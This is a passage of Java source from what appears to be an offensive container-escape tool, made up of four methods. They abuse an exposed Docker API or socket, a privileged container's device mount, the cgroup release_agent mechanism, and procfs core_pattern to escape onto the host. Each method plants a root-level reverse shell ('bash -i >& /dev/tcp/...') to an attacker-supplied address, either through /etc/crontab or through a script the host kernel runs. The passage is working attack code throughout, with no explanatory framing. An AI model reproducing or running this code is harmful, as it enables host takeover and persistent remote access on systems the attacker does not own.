    public static boolean DockerApiEscape(CurrentHost currentHost,String dockerIP,String dockerSock,String shellIP){
        String path;
        if (!dockerIP.isEmpty()){
            path = "tcp://" + dockerIP + ":2375";
            System.out.println("use Docker API: " + path);
        }else if (!dockerSock.isEmpty()){
            path = "unix://" + dockerSock;
            System.out.println("use Docker sock: " + path);
        }else if (!currentHost.getNodeIP().isEmpty()){
            path = "tcp://" + currentHost.getNodeIP() + ":2375";
            System.out.println("use Docker API: " + path);
        }else if (!currentHost.getDockerSockPath().isEmpty()){
            path = "unix://" + currentHost.getDockerSockPath();
            System.out.println("use Docker sock: " + path);
        }else {
            System.out.println("Docker API Path is Empty");
            return false;
        }
        shellIP = shellIP.replace(":","/");
        DefaultDockerClientConfig config = DefaultDockerClientConfig.createDefaultConfigBuilder().withDockerHost(path).build();
        ApacheDockerHttpClient httpClient = new ApacheDockerHttpClient.Builder().dockerHost(config.getDockerHost()).sslConfig(config.getSSLConfig()).build();
        // 初始化 Docker 客户端
        DockerClient dockerClient = DockerClientImpl.getInstance(config, httpClient);
        CreateContainerResponse container;
        try {
            dockerClient.pullImageCmd("alpine:latest").start().awaitCompletion(60, TimeUnit.SECONDS);
            Mount mount = new Mount().withType(MountType.BIND).withSource("/").withTarget("/host");
            ArrayList<Mount> mounts = new ArrayList<>();
            mounts.add(mount);
            container = dockerClient.createContainerCmd("alpine:latest").withCmd("/bin/sh", "-c", "echo '* * * * * root  bash -c \"bash -i >& /dev/tcp/" + shellIP + " 0>&1\"' >> /host/etc/crontab").withName("escape-check").withHostConfig(HostConfig.newHostConfig().withMounts(mounts)).exec();
            dockerClient.startContainerCmd(container.getId()).exec();
        } catch (InterruptedException e) {
            e.getStackTrace();
            return false;
        }
        try{
            dockerClient.stopContainerCmd(container.getId()).exec();
        }catch (Exception e){
            System.out.println();
        }
        dockerClient.removeContainerCmd(container.getId()).exec();
        return true;
    }

    public static boolean PrivilegeEscape(String shellIP){
        System.out.println("Privileged container escape......");
        shellIP = shellIP.replaceAll(":","/");
        long num = 0;
        try{
            String devicePath = "";
            Map<String, String[]> mounts = LInuxInfo.getMounts(true);
            for(String path:mounts.keySet()){
                if (mounts.get(path)[0].startsWith("/dev")) {
                    if ((Long.parseLong(mounts.get(path)[3]) + Long.parseLong(mounts.get(path)[4])) >= num){
                        num = Long.parseLong(mounts.get(path)[3]) + Long.parseLong(mounts.get(path)[4]);
                        devicePath = mounts.get(path)[0];
                    }
                }
            }
            CmdExeUtil.execute("mkdir /host/mnt");
            String cmd = "mount " + devicePath + " /host/mnt";
            String execute = CmdExeUtil.execute(cmd);
            if (execute.isEmpty()){
                System.out.println("Create a dir(/host/mnt) and mount it: success");
            }else {
                System.out.println("Create a dir and mount it: " + execute);
            }
            String shellPayload = "echo '* * * * * root  bash -c \"bash -i >& /dev/tcp/" + shellIP + " 0>&1\"' >> /host/etc/crontab";
            String execute1 = CmdExeUtil.execute(shellPayload);
            if (execute1.isEmpty()){
                System.out.println("Write a scheduled task: success");
            }else {
                System.out.println("Write a scheduled task: " + execute1);
            }
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean SysAdminEscape(String shellIP){
        shellIP = shellIP.replaceAll(":","/");
        System.out.println("SYS_ADMIN_CAP Escape......");
        try {
            String execute = CmdExeUtil.execute("mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp");
            if (execute.contains("permission denied")){
                System.out.println("Cgroup V2, Mount Permission Denied");
                return false;
            }
            CmdExeUtil.execute("mkdir /tmp/cgrp/x");
            CmdExeUtil.execute("echo 1 > /tmp/cgrp/x/notify_on_release");
            String path = CmdExeUtil.execute("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab").split("\n")[0] + "/cmd";
            System.out.println("Absolute Path: " + path);
            CmdExeUtil.execute("echo " + path + " > /tmp/cgrp/release_agent");
            CmdExeUtil.execute("echo '#!/bin/sh' > /cmd");
            CmdExeUtil.execute("echo 'setsid bash -i >& /dev/tcp/" + shellIP + " 0>&1 &' >> /cmd");
            CmdExeUtil.execute("chmod a+x /cmd");
            CmdExeUtil.execute("sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"");
            System.out.println("Execution completed");
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public static boolean ProcfsEscape(String shellIP,String procPath,CurrentHost currentHost){
        String proc = "";
        if (!procPath.isEmpty()){
            proc = procPath;
        }else if (!currentHost.getProcPath().isEmpty()){
            proc = currentHost.getProcPath();
        }else {
            System.out.println("Proc mount is Empty");
            return false;
        }
        if (!proc.endsWith("/")){
            proc += "/";
        }
        boolean exists = new File(proc + "sys/kernel/core_pattern").exists();
        if (!exists){
            System.out.println("Error,core_pattern does not exist");
            return false;
        }
        shellIP = shellIP.replaceAll(":","/");
        try {
            CmdExeUtil.execute("touch /tmp/shell | chmod +x /tmp/shell");
            CmdExeUtil.execute("touch /tmp/escape | chmod +x /tmp/escape");
            CmdExeUtil.execute("echo '#!/bin/bash' > /tmp/shell");
            CmdExeUtil.execute("echo 'setsid bash -i >& /dev/tcp/" + shellIP + " 0>&1 &' >> /tmp/shell");
            CmdExeUtil.execute("echo 'echo $$\nsleep 1\nkill -11 $$' > /tmp/escape");
            String path = CmdExeUtil.execute("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab").split("\n")[0] + "/tmp/shell";
            System.out.println("Absolute Path: " + path);
            CmdExeUtil.execute("echo '|" + path + "' > " + proc + "sys/kernel/core_pattern");
            CmdExeUtil.execute("/tmp/escape");
            System.out.println("Execution completed");
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        return true;
    }

